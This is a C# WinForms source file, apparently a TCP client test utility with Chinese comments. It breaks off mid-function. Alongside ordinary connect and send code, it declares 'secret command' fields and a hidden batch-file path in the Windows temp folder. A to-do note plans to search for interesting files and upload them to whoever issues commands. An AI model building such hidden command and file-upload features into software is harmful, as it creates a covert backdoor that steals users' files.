#region "using"

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic;

#endregion

#region "已完成软件功能备注"

//1、界面添加网络中所有可获取的IP地址，并添加至ListiView中，然后进行客户端或者服务器的通讯，保存相关参数数组；【OK】
//2、保存的参数数组应该包括内容：IP地址和端口【服务器只要保存监听端口号】、是否已经测试OK、结束符、【OK】
//3、点击相应IP地址进行测试，单击连接或监听按钮就检查原有ListView中是否有对应的IP地址和端口，没有的话就进行添加或是手动添加也可以；【OK】
//4、参数变更检查和更新：在点击【添加】和【连接】、【监听】按钮时要检索现有列表中是否已经有对应的IP地址和端口，如果没有就提示添加，否则就进行变更【OK】
//5、参数保存时，只以ListView内容为准，在修改过程中只验证其输入参数的有效性并修改相关记录；没有必要在过程中做临时变量进行保存【OK】
//6、需要在客户端连接和服务器监听时处理“是否测试”项，另外还要添加针对修改“是否测试”项和结束符的重载函数；【没有必要】
//7、重复添加相同的内容，需要查找原因；【OK】
//8、ListView中的Index号没有变动，需要再找原因；【OK】

//13、自动发送文字和文件；但是自动发送文件时还是会有问题，当文件大于发送缓冲区时，交界的一个中文字会变成乱码；【OK】

#endregion

#region "待处理软件功能和进度备注"

//9、
//   A、可以考虑有多少个IP地址就可以进行多少个以太网连接或者是更多，根据ListView的行数量决定，用动态数组来控制可用线程的个数
//   点击对应的行，首先判断是否已经在进行通信，没有就可以点击“连接”或“监听”按钮并建立对应的线程；
//  点击对应的行，首先判断是否已经在进行通信，进行中则可以点击“关闭”来结束相应的线程；
//=====通过客户端和服务器类的实例数组进行处理，会很方便；【OK】
//   B、串口界面也做同样的修改；
//**********************
//10、做一个串口和以太网的中继器，可以将串口转发给以太网或者以太网转发给串口，方向可以自定义；【】
//11、可以在里面添加自动搜索感兴趣的文件upload到发送命令的服务器或者客户端；而具体的服务器或者客户端的名字可以通过解析或者net view处理出来【】
//12、待处理：设立一个标志位来判断当连接建立后多久没有收到对方的回应就算断开连接，然后进行提醒或者是关闭连接再进行重新连接；【】

//14、自动发送文件时还是会有问题，当文件大于发送缓冲区时，交界的一个中文字会变成乱码,
//    待想办法my.network.upload/download或者用数据包的方式发送文件名称和文件长度，在接收端再进行处理；【】

#endregion

namespace PengDongNanTools
    {

    //TCP/IP以太网异步客户端通讯界面【软件作者：彭东南, southeastofstar@163.com】
    /// <summary>
    /// TCP/IP以太网异步客户端通讯界面【软件作者：彭东南, southeastofstar@163.com】
    /// </summary>
    public partial class TCPAsyncClientForm : Form
        {

        #region "变量定义"

        private delegate void AddTextDelegate(string TargetText);

        private int CurrentSelectedItemOfClientListView;

        private string[] SingleServerSend = {""};
        private string[] MultiServerSend = {""};
        private string TempTestIPAddress = "";
        private string ClientHeartBeatPulseText = "Client";
        frmAbout HelpDlg = new frmAbout();

        /// <summary>
        /// 更新信息至文本框时是否显示日期和时间，默认为True
        /// </summary>
        public bool ShowDateTimeForMessage = true;

        bool AutoResendFlag = false;
        bool SendFileFlag = false;
        private bool SuccessBuiltNew = false;
        private bool PasswordIsCorrect = false;
        bool StartMultiConnect = false;

        /// <summary>
        /// 是否在历史记录文本框中更新显示相同内容
        /// </summary>
        public bool UpdatingSameMessage = true;

        /// <summary>
        /// 是否发送/接收GB2312编码
        /// </summary>
        public bool GB2312Coding = false;

        /// <summary>
        /// 在关闭窗体时是否只是隐藏窗体
        /// </summary>
        public bool JustHideFormAtClosing = false;

        /// <summary>
        /// 在关闭窗体时是否提示
        /// </summary>
        public bool ShowPromptAtClosing = true;

        /// <summary>
        /// 客户端是否发送心跳信号
        /// </summary>
        //public bool ClientEnableHeartBeatPulse = false;

        /// <summary>
        /// 客户端是否发送16进制内容
        /// </summary>
        public bool ClientSendMessageInHEX = false;

        /// <summary>
        /// 是否已经完成IP地址搜索
        /// </summary>
        public bool SearchIPAddressDone = false;

        /// <summary>
        /// 已经找到的IP地址清单
        /// </summary>
        public string[] FoundIPAddressList = null;

        private string[] IPAddressList = null;

        private Endings ClientEndings= Endings.CRLF;
        private string Suffix="\r\n";

        OpenFileDialog newOpenFile = new OpenFileDialog();
        SaveFileDialog SaveLogAsTXTFile = new SaveFileDialog();
        
        ListViewOperation LV = new ListViewOperation("彭东南");
        Microsoft.VisualBasic.Devices.Computer PC = new Microsoft.VisualBasic.Devices.Computer();
        CommonFunction FC = new CommonFunction("彭东南");

        private string SecretCommand = "";
        private bool EnableSecretCommand = false;
        private string SecretBATFile = "C:\\windows\\temp\\God.bat";
        private Thread SecretThread = null;

        /// <summary>
        /// 自定义的结束符[用于发送时在发送的字符串最后加上]
        /// </summary>
        public string EndingCustomerizeSetting = "";

        /// <summary>
        /// 界面是否用中文显示
        /// </summary>
        public bool ChineseLanguage = true;

        //private bool ClientTestedOK = false;
        private bool ClientWorking = false;

        /// <summary>
        /// 错误和返回信息
        /// </summary>
        public string ErrorMessage = "";

        private string TempErrorMessage = "";

        /// <summary>
        /// 存储从服务器发来的字符串
        /// </summary>
        public string ReceivedDataFromServer = "";

        /// <summary>
        /// 客户端发送给服务器的字符串
        /// </summary>
        public string ClientSendToServerMessage = "";

        ///// <summary>
        ///// 用于接受服务器发来的字节
        ///// </summary>
        //private byte[] ClientReadDataBytesFromServer;

        private TCPIPAsyncClient SingleClient;
        private ushort TargetServerPort = 8000;//服务器以太网端口号
        private IPAddress TargetServerIPAddress;//服务器以太网IP地址
        //private bool ClientConnectToServerPortSuccess = false;//以太网客服端口连接到服务器端口标志

        private TCPIPAsyncClient[] Clients;
        //private Endings[] TempEndings;
        //private string[] TempServerIPAddress;
        //private ushort[] TempServerPort;
        private string[] TempCustomSuffix;
        
        /// <summary>
        /// 用于保存返回的客户端参数
        /// </summary>
        public SaveClientParameters[] FeedBackClientParameters;

        ///// <summary>
        ///// 用于临时保存客户端参数，以应对增加自定义IP地址的情况
        ///// </summary>
        //private SaveClientParameters[] TempFeedBackClientParameters;
       
        #endregion

        #region "属性和数据结构"

        /// <summary>
        /// 枚举:进行通讯时发送字符的结尾符号
        /// </summary>
        public enum Endings
            {

            /// <summary>
            /// 无
            /// </summary>
            None = 0,

            /// <summary>
            /// 换行符
            /// </summary>
            LF = 1,

            /// <summary>
            /// 回车符
            /// </summary>
            CR = 2,

            /// <summary>
            /// 回车换行符
            /// </summary>
            CRLF = 3,

            /// <summary>
            /// 自定义
            /// </summary>
            Customerize = 4
            }

        /// <summary>
        /// 软件作者
        /// </summary>
        public string Author
            {
            get { return "软件作者：彭东南, southeastofstar@163.com"; }
            }

        /// <summary>
        /// 待处理事项，后续再添加代码
        /// </summary>
        public string PendingIusse
            {
            get { return ""; }
            }

        /// <summary>
        /// 异步客户端发送心跳信号的间隔【单位：毫秒(ms)】
        /// </summary>
        public double IntervalForClientHeartBeat 
            {

            get 
                {
                return Convert.ToDouble(txtAutoSendInterval.Text);
                }

            set 
                {
                if (value <= 0)
                    {
                    MessageBox.Show("发送心跳信号的间隔必须大于0【单位：毫秒(ms)】");
                    return;
                    }
                else 
                    {
                    txtAutoSendInterval.Text = value.ToString();
                    if (SingleClient != null) 
                        {
                        SingleClient.AutoSendInterval = (uint)value;
                        }

                    if (Clients != null) 
                        {
                        for (int a = 0; a < Clients.Length; a++) 
                            {
                            Clients[a].AutoSendInterval = (uint)value;
                            }
                        }
                    }
                }
            
            }

        /// <summary>
        /// 异步客户端是否发送心跳信号
        /// </summary>
        public bool ClientEnableHeartBeat 
            {

            get { return chkAutoSend.Checked; }

            set 
                {
                chkAutoSend.Checked = value;

                if (SingleClient != null)
                    {
                    SingleClient.AutoSend = value;
                    }

                if (Clients != null)
                    {
                    for (int a = 0; a < Clients.Length; a++)
                        {
                        Clients[a].AutoSend = value;
                        }
                    }
                }
            
            }

        /// <summary>
        /// 异步客户端发送心跳信号的字符串内容
        /// </summary>
        public string ClientHeartBeatText 
            {

            get { return ClientHeartBeatPulseText; }

            set 
                {
                if (value == "")
                    {
                    MessageBox.Show("客户端心跳信号的内容不能为空.");
                    return;
                    }
                else 
                    {
                    ClientHeartBeatPulseText = value;
                    }
                }
            
            }

        /// <summary>
        /// 保存异步客户端参数的数据结构
        /// </summary>
        public struct SaveClientParameters 
            {
            /// <summary>
            /// 服务器IP地址
            /// </summary>
            public string TargetServerIPAddress;

            /// <summary>
            /// 服务器端口号
            /// </summary>
            public ushort TargetServerPort;

            /// <summary>
            /// 端口是否测试过
            /// </summary>
            public bool Tested;

            /// <summary>
            /// 通讯的结束符
            /// </summary>
            public Endings EndingSetting;
            }

        /// <summary>
        /// 获取/设置当前发送字符串的结束符
        /// </summary>
        public Endings EndingSetting 
            {

            get { return ClientEndings; }

            set 
                {
                //CR--\r回车符，LF--\n换行符
                switch(value)
                    {
                    case Endings.None:
                        Suffix = "";
                        ClientEndings = Endings.None;
                        break;
                        
                    case Endings.CR:
                        Suffix = "\r";
                        ClientEndings = Endings.CR;
                        break;

                    case Endings.LF:
                        Suffix = "\n";
                        ClientEndings = Endings.LF;
                        break;

                    case Endings.CRLF:
                        Suffix = "\r\n";
                        ClientEndings = Endings.CRLF;
                        break;

                    case Endings.Customerize:
                        if (EndingCustomerizeSetting != "")
                            {
                            Suffix = EndingCustomerizeSetting;
                            ClientEndings = Endings.Customerize;
                            }
                        else 
                            {
                            Suffix = "\r\n";
                            ClientEndings = Endings.CRLF;
                            MessageBox.Show("你已经设置通讯字符串的结束符为自定义，所以参数 'EndingCustomerizeSetting' 不能为空.已经修改接收符为回车+换行符");
                            }
                        break;

                    
                    }
                
                }
            
            }

        #endregion

        #region "窗体事件"

        private void txtTargetServerPort_TextChanged(object sender, EventArgs e)
            {

            }

        private void TCPClientForm_FormClosing(object sender, FormClosingEventArgs e)
            {

            try
                {

                if (JustHideFormAtClosing == true)
                    {
                    e.Cancel = true;
                    //AutoResendFlag = false;
                    //tmrAutoSend.Stop();
                    this.Hide();
                    return;
                    }

                //bool TempResult = false;
                if (ShowPromptAtClosing == true)
                    {
                    if (MessageBox.Show("Are you sure to exit?\r\n确定要退出吗？", "请确认",
                        MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.No)
                        {
                        e.Cancel = true;
                        return;
                        }
                    }

                AutoResendFlag = false;

                if (newOpenFile != null)
                    {
                    newOpenFile.Dispose();
                    newOpenFile = null;
                    }

                if (SaveLogAsTXTFile != null)
                    {
                    SaveLogAsTXTFile.Dispose();
                    SaveLogAsTXTFile = null;
                    }

                //释放客户端的相关资源
                if (SingleClient != null)
                    {
                    SingleClient.Close();
                    SingleClient = null;
                    }

                if (SecretThread != null)
                    {
                    SecretThread.Abort();
                    SecretThread = null;
                    }
                
                if (Clients != null)
                    {
                    for (int a = 0; a < Clients.Length; a++)
                        {
                        Clients[a].Close();
                        Clients[a] = null;
                        }
                    }

                }
            catch (Exception)//(Exception ex)
                {
                //MessageBox.Show(ex.Message);
                }

            }

        private void txtSendToServer_TextChanged(object sender, EventArgs e)
            {

            }

        private void txtSendToServer_KeyDown(object sender, KeyEventArgs e)
            {
            SingleServerSend[0] = txtSendToServer.Text;
            MultiServerSend[0] = txtSendToServer.Text;
            }

        private void TCPClientForm_Load(object sender, EventArgs e)
            {

            try
                {

                //            命名空间:       System.Net()
                //            程序集：   System在 System.dll 中
                //            语法()
                //            Public Shared Sub SetTcpKeepAlive(ByVal enabled As Boolean, ByVal keepAliveTime As Integer, ByVal keepAliveInterval As Integer)
                //            参数()
                //            enabled()
                //            类型:     System.Boolean()
                //            如果设置为 true，则将使用指定的 keepAliveTime 和 keepAliveInterval 值启用 TCP 连接上的 TCP keep-alive 选项。 
                //            如果设置为 false，则将禁用 TCP keep-alive 选项，并忽略剩余参数。
                //            默认值为 false。
                //            keepAliveTime()
                //            类型:     System.Int32()
                //            指定发送第一个 keep-alive 数据包之前没有活动的超时时间（以毫秒为单位）。
                //            该值必须大于 0。如果传递的值小于或等于零，则会引发 ArgumentOutOfRangeException。 
                //            keepAliveInterval()
                //            类型:     System.Int32()
                //            指定当未收到确认消息时发送连续 keep-alive 数据包之间的间隔（以毫秒为单位）。
                //            该值必须大于 0。如果传递的值小于或等于零，则会引发 ArgumentOutOfRangeException。 
                System.Net.ServicePointManager.SetTcpKeepAlive(true, 1000, 1000);

                if (PC.Network.IsAvailable == true)
                    {
                    NetworkStatus_Menu.Image = global::PengDongNanTools.Properties.Resources.NetworkAvailable;
                    NetworkStatus_Menu.ToolTipText = "网络已连接";
                    NetworkStatus_Menu.BackColor = Color.Green;
                    AddText("通知：网络已连接！");
                    }
                else
                    {
                    NetworkStatus_Menu.Image = global::PengDongNanTools.Properties.Resources.NoNetwork;
                    NetworkStatus_Menu.ToolTipText = "网络已断开";
                    NetworkStatus_Menu.BackColor = Color.Red;
                    AddText("警告：网络已断开！");
                    }

                //添加事件句柄：监控网络的断开和连接
                AddNetworkChange_EventHandler();

                cmbSuffixForClient.SelectedIndex = 3;
                chkClientSendHEX.Checked = false;
                //ClientTestedOK = false;
                
                //设定界面的语言
                LanguageForUserInterface();

                //添加可用IP地址到列表
                AddAvailableIPAddressToList();

                string[] TempStr = new string[4];
                string TempRet = FC.GetLocalIP4Address();
                //TempStr = Strings.Split(FC.GetLocalIP4Address(), ".");
                TempStr = Strings.Split(TempRet, ".");
                lblLocalIPAddress.Text = TempRet;
                mtxt_4.Text = TempStr[0];
                mtxt_3.Text = TempStr[1];
                mtxt_2.Text = TempStr[2];

                txtTargetServerPort.Text = "8000";

                //必须等到数据已经添加到列表中才能执行此聚焦的操作，否则出错
                //ClientListView1.Items[0].Focused = true;
                ClientListView1.Items[0].Selected = true;
                lblCurrentIndexForClientListView.Text = "1";

                }
            catch (Exception ex)
                {
                MessageBox.Show(ex.Message);
                }

            }
        
        private void SavePara_ToolStripMenuItem_Click(object sender, EventArgs e)
            {

            SavePara_ToolStripMenuItem.Enabled = false;

            try
                {

                SaveParameters();
                AddText("已经成功保存客户端的参数...");

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            SavePara_ToolStripMenuItem.Enabled = true;

            }

        private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
            {

            try
                {

                if(MessageBox.Show("It will take a few seconds to search all available IP addresses," +
                    "also will clear all current records including [IP address,Port,Ending], "+
                    "are you sure to continue?\r\n需要一些时间才能完成IP地址的搜索，" + 
                    "并且会清除现有记录【包括IP地址、端口、结束符】确定继续吗？","确认",
                    MessageBoxButtons.YesNo,MessageBoxIcon.Question)==DialogResult.Yes)
                    {
                    AddText("正在执行搜索IP地址，请耐心等待...");
                    RefreshToolStripMenuItem.Enabled = false;

                    AddAvailableIPAddressToList();

                    AddText("已完成IP地址的搜索:" + 
                        ((IPAddressList.Length == 1)? "无可用网络": (IPAddressList.Length + "个IP地址可用")));
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            RefreshToolStripMenuItem.Enabled = true;

            }

        private void SearchPCName_ToolStripMenuItem1_Click(object sender, EventArgs e)
            {

            SearchPCName_ToolStripMenuItem1.Enabled = false;

            try
                {

                string[] TempPCNames = FC.SearchAvailablePCNames();
                for (int a = 0; a < TempPCNames.Length; a++) 
                    {
                    AddText("已找到计算机-- No.: " + (a + 1) + "  名称：" + TempPCNames[a]);
                    }
                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            SearchPCName_ToolStripMenuItem1.Enabled = true;

            }

        private void MACToolStripMenuItem_Click(object sender, EventArgs e)
            {

            MACToolStripMenuItem.Enabled = false;

            try
                {
                string[] TempStr;
                int TempCount = 0;

                NetworkInterface[] NetworkInterfaces;
                NetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();

                if (NetworkInterfaces.Length > 0) 
                    {
                    foreach (NetworkInterface a in NetworkInterfaces)
                        {
                        TempStr = new string [TempCount+1];
                        TempCount += 1;

                    rtbTCPIPHistory.Text += "MAC地址：" + a.GetPhysicalAddress().ToString() + Environment.NewLine +
                        "网络连接：" + a.Name + Environment.NewLine +
                        "网卡序列号：" + a.Id + Environment.NewLine +
                        "网络类型：" + a.NetworkInterfaceType.ToString() + Environment.NewLine +
                        "网络速度：" + (a.Speed / (1024 * 1024)).ToString() + "MB" + Environment.NewLine;
                        }
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            MACToolStripMenuItem.Enabled = true;

            }

        private void EnglishToolStripMenuItem_Click(object sender, EventArgs e)
            {

            try
                {

                if (ChineseLanguage == true) 
                    {
                    ChineseLanguage = false;
                    LanguageForUserInterface();
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void 中文ToolStripMenuItem_Click(object sender, EventArgs e)
            {

            try
                {

                if (ChineseLanguage == false)
                    {
                    ChineseLanguage = true;
                    LanguageForUserInterface();
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void AboutToolStripMenuItem_Click(object sender, EventArgs e)
            {

            try
                {

                HelpDlg.ShowDialog();

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void btnSearchIP_Click(object sender, EventArgs e)
            {

            try
                {

                if (PC.Network.IsAvailable == false) 
                    {
                    MessageBox.Show("This compueter has not connected to the network yet, please check the reason and retry." +
                   "\r\n计算机未连接到网络，请检查原因后再尝试搜索.", "提示", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    return;
                    }

                if (mtxt_4.Text == "" |
                    mtxt_3.Text == "" |
                    mtxt_2.Text == "") 
                    {
                    MessageBox.Show("The IP address section can't be empty.\r\n" +
                        "IP地址段不能为空", "提示", MessageBoxButtons.OK, 
                        MessageBoxIcon.Exclamation);
                    return;
                    }

                if((Convert.ToInt16(mtxt_4.Text) < 0 & Convert.ToInt16(mtxt_4.Text) > 255)
                    | (Convert.ToInt16(mtxt_3.Text) < 0 & Convert.ToInt16(mtxt_3.Text) > 255)
                    | (Convert.ToInt16(mtxt_2.Text) < 0 & Convert.ToInt16(mtxt_2.Text) > 255))
                    {
                    MessageBox.Show("The IP address section must be 0~255.\r\n" +
                        "IP地址段的值必须为0~255");
                    return;
                    }

                btnSearchIP.Enabled = false;
                mtxt_2.Enabled = false;
                mtxt_3.Enabled = false;
                mtxt_4.Enabled = false;

                string TempIPSegement = mtxt_4.Text + "." + mtxt_3.Text + "." + mtxt_2.Text;
                string[] FoundIPAddresses = null;
                AddText("正在搜索网络中的以太网设备...");

                FoundIPAddresses=FC.SearchIPAddressForCertainSegment(TempIPSegement);

                if (FoundIPAddresses == null)
                    {
                    AddText("未找到以太网设备...");
                    }
                else 
                    {
                    string[] TempArray = new string[4];
                    bool ret = false;
                    for (int a = 0; a < FoundIPAddresses.Length; a++) 
                        {
                        TempArray[0] = FoundIPAddresses[a];
                        TempArray[1] = "8888";
                        TempArray[2] = "False";
                        TempArray[3] = "CRLF";

                        LV.AddSameRecord = false;
                        ret = LV.AddRowRecordInListView(ref ClientListView1, TempArray);
                        if (ret == true)
                            {
                            AddText(("Added device-- No.: " + (a + 1) + ", IP address: " + FoundIPAddresses[a]));
                            }
                        else 
                            {
                            AddText(("Failed to add device-- No.: " + (a + 1) + ", IP address: " + FoundIPAddresses[a]));
                            }
                        }
                    }

                //SearchIPAddressForCertainSegment();

                btnSearchIP.Enabled = true;
                mtxt_2.Enabled = true;
                mtxt_3.Enabled = true;
                mtxt_4.Enabled = true;

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void btnDelClientRecordInListView_Click(object sender, EventArgs e)
            {

            try
                {

                if (ClientListView1.Items.Count >= 1)
                    {
                    if (ClientListView1.FocusedItem.Selected == true)
                        {
                        LV.ShowPromptWhenDelOrAdd = false;
                        if (LV.DelRow(ref ClientListView1, ClientListView1.FocusedItem.Index + 1) == true)
                            {
                            AddText("成功删除行");
                            }
                        else 
                            {
                            AddText("删除行操作失败");
                            }
                        }
                    else 
                        {
                        AddText("无效操作：未选中列表中任何行，无法执行删除操作.");
                        MessageBox.Show("You did not select any item of the list.\r\n" + 
                            "无效操作：未选中列表中任何行，无法执行删除操作.");
                        return;
                        }
                    }
                else 
                    {
                    AddText("无效操作：列表中无任何行数据，无法执行删除操作.");
                    MessageBox.Show("无效操作：列表中无任何行数据，无法执行删除操作.");
                    return;
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void btnAddPortForClient_Click(object sender, EventArgs e)
            {

            try
                {

                if((FC.VerifyIPAddressAndPort(txtTargetServerIPAddress.Text, 
                    Convert.ToUInt16(txtTargetServerPort.Text))==true))                    
                    {
                    string[] TempRecord = new string[4];
                    TempRecord[0] = txtTargetServerIPAddress.Text;
                    TempRecord[1] = txtTargetServerPort.Text;
                    TempRecord[2] = "False";
                    TempRecord[3] = "CRLF";

                    if (LV.AddRowRecordInListView(ref ClientListView1, TempRecord) == true)
                        {
                        AddText("添加行记录成功: " + txtTargetServerIPAddress.Text + 
                            "  " + txtTargetServerPort.Text + "  False  CRLF");
                        }
                    else 
                        {
                        AddText("添加行记录失败: " + txtTargetServerIPAddress.Text +
                            "  " + txtTargetServerPort.Text + "  False  CRLF");
                        }
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void btnReviseClientRecord_Click(object sender, EventArgs e)
            {

            try
                {

                string[] TempRecord = new string[4];
                TempRecord[0] = txtTargetServerIPAddress.Text;
                TempRecord[1] = txtTargetServerPort.Text;
                TempRecord[2] = "False";
                //0~4: None, LF, CR, CR+LF,CustomizedEnding

                if (cmbSuffixForClient.SelectedIndex < 0) 
                    {
                    cmbSuffixForClient.SelectedIndex = 3;
                    }

                switch (cmbSuffixForClient.SelectedIndex)
                    {

                    case 0:
                        TempRecord[3] = "";
                        Suffix = "";
                        break;

                    case 1:
                        TempRecord[3] = "LF";
                        Suffix = "\n";
                        break;

                    case 2:
                        TempRecord[3] = "CR";
                        Suffix = "\r";
                        break;

                    case 3:
                        TempRecord[3] = "CRLF";
                        Suffix = "\r\n";
                        break;

                    case 4:
                        TempRecord[3] = "CUS";
                        Suffix = txtCustomizedEndingCodeForClient.Text;
                        break;

                    }

                if (LV.ModifyRowRecord(ref ClientListView1, TempRecord,
                                           CurrentSelectedItemOfClientListView))
                    {
                    AddText("成功修改记录");
                    }
                else
                    {
                    AddText("修改记录失败");
                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void btnMultiListen_Click(object sender, EventArgs e)
            {

            try
                {

                if (ClientListView1.CheckedItems.Count < 2)
                    {
                    MessageBox.Show("Please check the row of target server/port you want to connect first before you execute the connect operation." +
                       "\r\n请在执行连接多服务器/端口前选中两个及两个以上的服务器/端口号。");
                    return;
                    }

                if (StartMultiConnect == true)
                    {

                    if (MessageBox.Show("Are you sure to stop the multi-port connect?" +
                        "\r\n确定要停止多服务器/端口连接吗？", "Notice", MessageBoxButtons.YesNo,
                        MessageBoxIcon.Question) == DialogResult.No)
                        {
                        return;
                        }
                    else
                        {
                        StartMultiConnect = false;

                        if (Clients != null)
                            {

                            for (int a = 0; a < Clients.Length; a++)
                                {
                                try
                                    {
                                    Clients[a].AutoSend = false;
                                    Clients[a].Close();
                                    Clients[a] = null;
                                    AddText("成功关闭异步客户端连接服务器端口：" + (a + 1));
                                    }
                                catch (Exception ex)
                                    {
                                    AddText("关闭异步客户端连接服务器端口 " + (a + 1) + " 错误：" + ex.Message);
                                    }
                                }

                            }

                        if (ChineseLanguage == true)
                            {
                            btnMultiConnect.Text = "开多端口连接";
                            }
                        else
                            {
                            btnMultiConnect.Text = "Multi Connect";
                            }

                        AddText("停止异步客户端连接多服务器/端口...");
                        if (ClientWorking == false)
                            {
                            btnClientSendToServer.Enabled = false;
                            }

                        }

                    }
                else //开始监听多端口
                    {

                    //发送文本字符
                    if (cmbSuffixForClient.SelectedIndex == 4 &
                        txtCustomizedEndingCodeForClient.Text == "")
                        {
                        AddText("自定义的结束符不能为空，请输入相应的文本。");
                        Suffix = "";
                        //MessageBox.Show("The text for the Ending can't be empty, please enter the text you want to be set." +
                        //   "\r\n自定义的结束符不能为空，请输入相应的文本。");
                        //return;
                        }
                    else if (cmbSuffixForClient.SelectedIndex == 4 &
                        txtCustomizedEndingCodeForClient.Text != "")
                        {
                        Suffix = txtCustomizedEndingCodeForClient.Text;
                        }
                    
                    //0~4: None, LF, CR, CR+LF,CustomizedEnding
                    TempCustomSuffix = new string[ClientListView1.CheckedItems.Count];

                    Clients = new TCPIPAsyncClient[ClientListView1.CheckedItems.Count];
                    for (int a = 0; a < Clients.Length; a++)
                        {
                        try
                            {
                            Clients[a] = new TCPIPAsyncClient(ClientListView1.CheckedItems[a].SubItems[1].Text,
                            Convert.ToUInt16(ClientListView1.CheckedItems[a].SubItems[2].Text), ref this.rtbTCPIPHistory, "彭东南");
                            Clients[a].AutoSend = true;

                            switch (ClientListView1.CheckedItems[a].SubItems[3].Text)
                                {

                                case "":
                                    TempCustomSuffix[a] = "";
                                    break;

                                case "CR":
                                    TempCustomSuffix[a] = "\r";
                                    break;

                                case "LF":
                                    TempCustomSuffix[a] = "\n";
                                    break;

                                case "CRLF":
                                    TempCustomSuffix[a] = "\r\n";
                                    break;

                                case "CUS":
                                    //待优化：目前没有做到记忆，因为多服务器/端口连接的变化不定，还没有找到合适的方法对应处理
                                    TempCustomSuffix[a] = txtCustomizedEndingCodeForClient.Text;
                                    break;

                                }

                            AddText("启动异步客户端连接多服务器/端口 " + (a + 1) + " 成功...");
                            }
                        catch (Exception ex)
                            {
                            AddText("启动异步客户端连接多服务器/端口 " + (a + 1) + " 错误：" + ex.Message);
                            }
                        }

                    if (ChineseLanguage == true)
                        {
                        btnMultiConnect.Text = "关多端口连接";
                        }
                    else
                        {
                        btnMultiConnect.Text = "Close Multi";
                        }

                    AddText("启动异步客户端连接多服务器/端口...");
                    StartMultiConnect = true;
                    btnClientSendToServer.Enabled = true;

                    }

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void btnConnectToServer_Click(object sender, EventArgs e)
            {

            //ClientTestedOK = false;
            ClientWorking = true;

            IPAddress TempIPAddress = IPAddress.Parse("127.0.0.1");
            string[] GetCorrectIPAddress = new string[4];
            Int16[] TempGetIPAddress = new Int16[4];

            try
                {

                //判断输入的服务器IP地址是否正确
                if (FC.VerifyIPAddressAndPort(txtTargetServerIPAddress.Text,
                    Convert.ToUInt16(txtTargetServerPort.Text)) == true)
                    {
                    IPAddress.TryParse(txtTargetServerIPAddress.Text, out TargetServerIPAddress);
                    TargetServerPort = Convert.ToUInt16(txtTargetServerPort.Text);
                    }
                else 
                    {
                    AddText("IP地址和服务器端口验证失败，请检查参数.");
                    return;
                    }

                //}

                SingleClient = new TCPIPAsyncClient(TargetServerIPAddress.ToString(), TargetServerPort, ref this.rtbTCPIPHistory, "彭东南");
                SingleClient.AutoSend = true;

                btnConnectToServer.Enabled = false;
                btnCloseClient.Enabled = true;
                btnClientSendToServer.Enabled = true;
                AddText("启动异步客户端...");
                
                btnAddPortForClient.Enabled = false;
                txtTargetServerIPAddress.Enabled = false;
                txtTargetServerPort.Enabled = false;

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void btnCloseClient_Click(object sender, EventArgs e)
            {

            try
                {

                btnAddPortForClient.Enabled = true;
                txtTargetServerIPAddress.Enabled = true;
                txtTargetServerPort.Enabled = true;
                ClientWorking = false;

                //释客户端的相关资源
                if (SingleClient != null)
                    {
                    SingleClient.AutoSend = false;
                    SingleClient.Close();
                    SingleClient = null;
                    }

                btnConnectToServer.Enabled = true;
                btnClientSendToServer.Enabled = false;
                btnCloseClient.Enabled = false;

                AddText("关闭异步客户端...");

                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }

            }

        private void btnClientSendToServer_Click(object sender, EventArgs e)
            {

            try
                {

                if (AutoResendFlag == true) 
                    {
                    MessageBox.Show("Now the software is under auto-send mode, " + 
                        "please change it if you want to send it manually.\r\n" +
                        "软件运行在自动发送模式，请先切换至手动发送。");
                    return;
                    }

                if (SingleClient == null)
                    {
                    AddText("异步客户端单端口连接没有创建...");
                    }
                else 
                    {
                    if (SingleClient.Connected == false) 
                        {
                        AddText("异步客户端单端口没有与服务器建立连接...");
                        }
                    }

                if (Clients == null) 
                    {
                    AddText("连接多服务器/端口的异步客户端没有创建...");
                    }

                //发送字符串
                if (SendFileFlag == false)
                    {

                    if(cmbSuffixForClient.SelectedIndex == 4 &
                        txtCustomizedEndingCodeForClient.Text == "")
                        {
                        MessageBox.Show("The text for the Ending can't be empty, please enter the text you want to be set." +
                           "\r\n自定义的结束符不能为空，请输入相应的文本。");
                        return;
                        }
                    else if (cmbSuffixForClient.SelectedIndex == 4 &
                        txtCustomizedEndingCodeForClient.Text != "")
                        {
                        Suffix = txtCustomizedEndingCodeForClient.Text;
                        }

                    if (txtSendToServer.Text != "")
                        {

                        string[] TempString = {""};
                        TempString[0] = txtSendToServer.Text;

                        //单端口客户端进行发送
                        if (SingleClient != null)
                            {
                            if (ClientSendMessageInHEX == true)
                                {
                                TempString[0] = FC.StringConvertToHEX(TempString + Suffix);
                                SingleClient.SendMessage = TempString;
                                }
                            else
                                {
                                if (GB2312Coding == true)
                                    {
                                    SingleClient.ReceiveGB2312Code = false;
                                    }
                                else
                                    {
                                    SingleClient.ReceiveGB2312Code = false;
                                    }
                                SingleClient.SendMessage = TempString;
                                }
                            }

                        //发送文本到多服务器/端口
                        if (Clients != null)
                            {
                            for (int a = 0; a < Clients.Length; a++)
                                {
